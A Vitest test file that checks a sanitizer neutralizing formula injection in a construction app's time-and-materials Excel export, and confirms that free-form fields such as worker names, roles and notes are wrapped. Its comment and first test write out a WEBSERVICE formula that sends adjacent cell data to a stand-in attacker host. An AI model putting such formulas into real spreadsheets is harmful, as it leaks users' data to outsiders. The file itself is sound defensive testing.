import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { sanitizeExcelCell } from '../lib/safeXlsx'

// The T&M Excel exporter (src/components/TMList.jsx `exportToExcel`)
// writes free-form foreman input — worker names, roles, custom item
// and category labels, ticket notes — straight into an .xlsx via
// XLSX.utils.json_to_sheet. Any of those fields that starts with
// = + - @ TAB or CR is evaluated as a formula when the office opens
// the sheet, so =WEBSERVICE("https://attacker/"&A2) exfiltrates the
// adjacent row and =HYPERLINK("…", "Approve") steals the click.
//
// Every string written through json_to_sheet in that export must pass
// through sanitizeExcelCell (imported as xs). These tests pin both the
// function's behavior and the TMList call-sites so a future cleanup
// can't drop the wrap and silently re-open the hole.

const tmListSource = (() => {
  const here = dirname(fileURLToPath(import.meta.url))
  return readFileSync(join(here, '..', 'components', 'TMList.jsx'), 'utf8')
})()

describe('T&M Excel export cell sanitization', () => {
  it('sanitizeExcelCell neutralizes a leading = so the cell is not a formula', () => {
    expect(sanitizeExcelCell('=WEBSERVICE("https://attacker/"&A1)')).toBe(
      "'=WEBSERVICE(\"https://attacker/\"&A1)"
    )
  })

  it('neutralizes the other leading formula triggers', () => {
    expect(sanitizeExcelCell('+1+1')).toBe("'+1+1")
    expect(sanitizeExcelCell('-1-1')).toBe("'-1-1")
    expect(sanitizeExcelCell('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(sanitizeExcelCell('\t=1+1')).toBe("'\t=1+1")
    expect(sanitizeExcelCell('\r=1+1')).toBe("'\r=1+1")
  })

  it('leaves ordinary text alone and passes numbers / null through', () => {
    expect(sanitizeExcelCell('Change Order 42')).toBe('Change Order 42')
    expect(sanitizeExcelCell(42)).toBe(42)
    expect(sanitizeExcelCell(null)).toBe(null)
    expect(sanitizeExcelCell(undefined)).toBe(undefined)
  })

  it('TMList.jsx imports the sanitizer as xs from safeXlsx', () => {
    expect(tmListSource).toMatch(
      /import\s*\{[^}]*sanitizeExcelCell\s+as\s+xs[^}]*\}\s*from\s*['"]\.\.\/lib\/safeXlsx['"]/
    )
  })

  it('wraps every user-entered string the Excel export writes', () => {
    // Workers sheet: free-form name and role.
    expect(tmListSource).toMatch(/'Worker Name':\s*xs\(worker\.name\)/)
    expect(tmListSource).toMatch(/'Role':\s*xs\(worker\.role\s*\|\|\s*'Laborer'\)/)
    // Items sheet: custom_category / custom_name / materials unit all
    // reach the exporter as free-form strings.
    expect(tmListSource).toMatch(/'Category':\s*xs\(category\)/)
    expect(tmListSource).toMatch(/'Item':\s*xs\(itemName\)/)
    expect(tmListSource).toMatch(/'Unit':\s*xs\(unit\)/)
    // Summary sheet: free-form ticket notes.
    expect(tmListSource).toMatch(/'Notes':\s*xs\(ticket\.notes\s*\|\|\s*''\)/)
  })
})
